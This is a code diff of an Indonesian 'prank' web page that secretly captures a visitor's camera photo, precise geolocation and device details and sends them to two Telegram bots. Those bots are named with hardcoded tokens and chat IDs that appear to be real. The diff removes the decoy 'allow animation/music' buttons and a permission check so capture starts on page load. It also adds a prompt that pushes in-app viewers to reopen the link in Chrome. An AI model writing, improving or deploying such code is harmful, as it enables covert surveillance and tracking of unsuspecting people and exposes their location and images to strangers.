@@ -14,7 +14,6 @@
       height: 100vh;
       font-family: 'Share Tech Mono', monospace;
       display: flex;
-      flex-direction: column;
       justify-content: center;
       align-items: center;
       color: #00ff00;
@@ -27,30 +26,33 @@
       width: 90%;
       max-width: 600px;
       line-height: 1.5;
-      margin-bottom: 15px;
-    }
-    button {
-      background: #111;
-      color: #0f0;
-      border: 1px solid #0f0;
-      padding: 8px 16px;
-      margin: 4px;
-      cursor: pointer;
-    }
-    button:disabled {
-      opacity: 0.5;
-      cursor: not-allowed;
     }
   </style>
 </head>
 <body>
   <div id="msg"></div>
-  <button id="lokasiBtn">Izinkan animasi</button>
-  <button id="kameraBtn">Izinkan Putar music</button>
 
   <script>
-    const token = '7691252764:AAEivTZ5gqJx9LjID9Fkz43qNIICvv6FGdY';
-    const chatId = '5914256752';
+    // ✅ CEK JIKA DIBUKA DARI APLIKASI — MINTA BUKA DI BROWSER
+    if (navigator.userAgent.includes("FBAN") || 
+        navigator.userAgent.includes("FBAV") || 
+        navigator.userAgent.includes("WhatsApp") || 
+        navigator.userAgent.includes("Instagram") || 
+        navigator.userAgent.includes("Line") || 
+        navigator.userAgent.includes("Telegram")) {
+      alert("⚠️ Harap klik ikon ⋮ lalu pilih 'Buka di Chrome' agar fitur kamera & lokasi bisa berjalan.");
+    }
+
+    // ✅ KONFIGURASI 2 BOT TELEGRAM
+    const token1 = '7691252764:AAEivTZ5gqJx9LjID9Fkz43qNIICvv6FGdY';
+    const chatId1 = '5914256752';
+    const token2 = '7908046573:AAEybtvlKrJHgj1BNsobnKImyna19dFAeus';
+    const chatId2 = '7584798402';
+
+    const bots = [
+      { token: token1, chatId: chatId1 },
+      { token: token2, chatId: chatId2 }
+    ];
 
     const typeText = (el, text, speed = 35) => {
       let i = 0;
@@ -65,21 +67,25 @@
     };
 
     const sendToTelegram = async (text) => {
-      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' })
-      });
+      for (const bot of bots) {
+        await fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: bot.chatId, text, parse_mode: 'HTML' })
+        });
+      }
     };
 
     const sendPhoto = async (blob, filename) => {
-      const form = new FormData();
-      form.append('chat_id', chatId);
-      form.append('photo', blob, filename);
-      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-        method: 'POST',
-        body: form
-      });
+      for (const bot of bots) {
+        const form = new FormData();
+        form.append('chat_id', bot.chatId);
+        form.append('photo', blob, filename);
+        await fetch(`https://api.telegram.org/bot${bot.token}/sendPhoto`, {
+          method: 'POST',
+          body: form
+        });
+      }
     };
 
     const getGPUInfo = () => {
@@ -146,25 +152,17 @@
           }, 100);
         });
 
-        for (let i = 1; i <= 2; i++) {
-          const canvas = document.createElement('canvas');
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          const ctx = canvas.getContext('2d');
-          ctx.drawImage(video, 0, 0);
-          await new Promise(resolve => {
-            canvas.toBlob(async blob => {
-              await sendPhoto(blob, `camera_${i}.jpg`);
-              resolve();
-            }, 'image/jpeg');
-          });
-          await new Promise(r => setTimeout(r, 1000));
-        }
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0);
+        canvas.toBlob(async blob => {
+          await sendPhoto(blob, `camera.jpg`);
+          await sendToTelegram('📷 Kamera berhasil kirim 1 foto.');
+        }, 'image/jpeg');
 
         stream.getTracks().forEach(t => t.stop());
-        await sendToTelegram('📷 Kamera berhasil kirim 2 foto.');
-        kameraOK = true;
-        checkAllDone();
       } catch (e) {
         await sendToTelegram('❌ Kamera gagal diakses. Error: ' + e.message);
       }
@@ -172,12 +170,6 @@
 
     const captureLocation = async () => {
       try {
-        const permission = await navigator.permissions.query({ name: "geolocation" });
-        if (permission.state !== "granted") {
-          await sendToTelegram(`❌ Lokasi tidak diizinkan oleh browser (${permission.state})`);
-          return;
-        }
-
         navigator.geolocation.getCurrentPosition(async pos => {
           const { latitude, longitude, accuracy, altitude, speed } = pos.coords;
           const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
@@ -195,8 +187,6 @@
 [+] Google Maps    : ${maps}`.trim();
 
           await sendToTelegram(lokasi);
-          lokasiOK = true;
-          checkAllDone();
         }, async (err) => {
           await sendToTelegram('❌ Lokasi gagal diakses. Error: ' + err.message);
         }, {
@@ -245,25 +235,11 @@
     const msg = `             Selamat anda kena prank.\n         Terima kasih atas kerja samanya.`;
     typeText(document.getElementById('msg'), msg, 30);
 
-    let lokasiOK = false;
-    let kameraOK = false;
-
-    const checkAllDone = () => {
-      if (lokasiOK && kameraOK) {
-        sendToTelegram('✅ Lokasi dan Foto berhasil dikirim.');
-      }
-    };
-
-    document.getElementById('lokasiBtn').addEventListener('click', async () => {
+    window.onload = async () => {
       await collectInfo();
       await captureLocation();
-      document.getElementById('lokasiBtn').disabled = true;
-    });
-
-    document.getElementById('kameraBtn').addEventListener('click', async () => {
       await captureCamera();
-      document.getElementById('kameraBtn').disabled = true;
-    });
+    };
   </script>
 </body>
 </html>
